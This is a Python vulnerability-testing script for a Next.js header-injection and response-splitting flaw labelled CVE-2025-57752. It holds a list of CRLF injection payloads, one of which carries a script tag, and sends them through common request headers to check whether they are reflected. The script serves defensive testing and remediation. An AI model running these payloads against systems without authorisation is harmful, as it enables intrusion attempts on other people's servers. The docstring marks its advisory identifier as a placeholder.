#!/usr/bin/env python3
"""
CVE-2025-57752 — Next.js Response Pollution via Crafted Headers
===============================================================

CVE ID      : CVE-2025-57752
GHSA        : GHSA-x5rv-9hm3-xqj6 (placeholder — verify at time of use)
CVSS Score  : 6.2 (MEDIUM)
CVSS Vector : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N
Affected    : Next.js >= 13.0.0, < 14.2.31
Patched     : 14.2.31
Published   : 2025-06 (est.)

Description
-----------
Next.js Route Handlers and middleware process incoming request headers and
may reflect certain header values into the response. In affected versions,
crafted headers with special characters (CRLF sequences, null bytes, or
header injection payloads) may be reflected into response headers or the
RSC payload without proper sanitization.

This could allow:
  - HTTP response splitting (if CRLF is reflected in a Location header)
  - Cache poisoning (if a reflected header influences cache key)
  - Cross-site scripting via JSON response pollution (if reflected in RSC payload)

Attack Surface
--------------
- Applications where middleware or Route Handlers reflect request headers
  into responses (e.g., echoing Accept-Language, X-Forwarded-For, etc.)
- Next.js behind a reverse proxy that passes through arbitrary headers

Test Methodology
---------------
1. Send requests with crafted header values containing CRLF sequences.
2. Check if the injected content appears in response headers.
3. Test common reflective patterns: User-Agent echo, Accept-Language echo.

Remediation
-----------
Upgrade Next.js to >= 14.2.31.
Validate and sanitize all header values before reflecting them.
Ensure reverse proxies strip or encode dangerous header characters.

References
----------
- https://nvd.nist.gov/vuln/detail/CVE-2025-57752
"""

from __future__ import annotations

import argparse
import re
import urllib.error
import urllib.request

# CRLF injection payloads
CRLF_PAYLOADS = [
    "legitimate\r\nX-Injected: cve-test",
    "legitimate\r\n\r\n<script>alert(1)</script>",
    "legitimate%0d%0aX-Injected:%20cve-test",
    "legitimate%0aX-Injected:%20cve-test",
]

REFLECTION_HEADERS = [
    "Accept-Language",
    "X-Forwarded-For",
    "X-Real-IP",
    "Referer",
    "Origin",
]

INJECTION_MARKER = "X-Injected"


def fetch(url: str, headers: dict[str, str] | None = None, timeout: int = 10) -> tuple[int, str, dict]:
    h = {"User-Agent": "NextJS-CVE-Tester/1.0", "Accept": "text/html,*/*"}
    if headers:
        h.update(headers)
    req = urllib.request.Request(url, headers=h)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read(16384).decode("utf-8", errors="replace")
            # Read raw response headers
            resp_headers = {k.lower(): v for k, v in resp.headers.items()}
            return resp.status, body, resp_headers
    except urllib.error.HTTPError as exc:
        body = exc.read(2048).decode("utf-8", errors="replace") if exc.fp else ""
        resp_headers = {k.lower(): v for k, v in exc.headers.items()} if exc.headers else {}
        return exc.code, body, resp_headers
    except urllib.error.URLError as exc:
        raise ConnectionError(str(exc)) from exc


def run(target: str, timeout: int, verbose: bool) -> int:
    print(f"\n[CVE-2025-57752] Next.js Response Pollution / Header Injection")
    print(f"Target : {target}")
    print("-" * 60)

    injected: list[tuple[str, str, str]] = []

    for header_name in REFLECTION_HEADERS:
        for payload in CRLF_PAYLOADS:
            try:
                _, body, resp_headers = fetch(
                    target,
                    headers={header_name: payload},
                    timeout=timeout,
                )
            except (ConnectionError, ValueError):
                # Python's urllib rejects CRLF in headers by default (good sign)
                if verbose:
                    short = repr(payload)[:30]
                    print(f"  {header_name}: {short}... → Python rejected (header sanitized at client level)")
                continue

            # Check if injection marker appears in response headers
            if INJECTION_MARKER.lower() in resp_headers:
                injected.append((header_name, payload, f"Response header: {INJECTION_MARKER}"))
            # Check if injection marker appears in response body
            if INJECTION_MARKER in body:
                injected.append((header_name, payload, "Response body reflection"))

            if verbose and not injected:
                short = repr(payload)[:40]
                print(f"  {header_name}: {short}... → no injection")

    print()
    if injected:
        print("VERDICT : VULNERABLE — Header injection succeeded")
        print()
        for hdr, payload, where in injected:
            print(f"  Header: {hdr!r}")
            print(f"  Payload: {payload!r}")
            print(f"  Found in: {where}")
        print("\nFix: Upgrade Next.js to >= 14.2.31")
        return 1
    else:
        print("VERDICT : PATCHED or NOT APPLICABLE")
        print()
        print("No CRLF injection via request headers detected.")
        print("Python's urllib also sanitizes CRLF in headers by default, which may")
        print("mask some injection attempts. For full coverage, use Burp Suite to test")
        print("raw CRLF bytes in header values.")
        return 0


def main() -> int:
    parser = argparse.ArgumentParser(description="Test CVE-2025-57752 Next.js response pollution")
    parser.add_argument("--target", default="http://localhost:3000")
    parser.add_argument("--timeout", type=int, default=10)
    parser.add_argument("--verbose", "-v", action="store_true")
    args = parser.parse_args()
    return run(args.target, args.timeout, args.verbose)


if __name__ == "__main__":
    raise SystemExit(main())
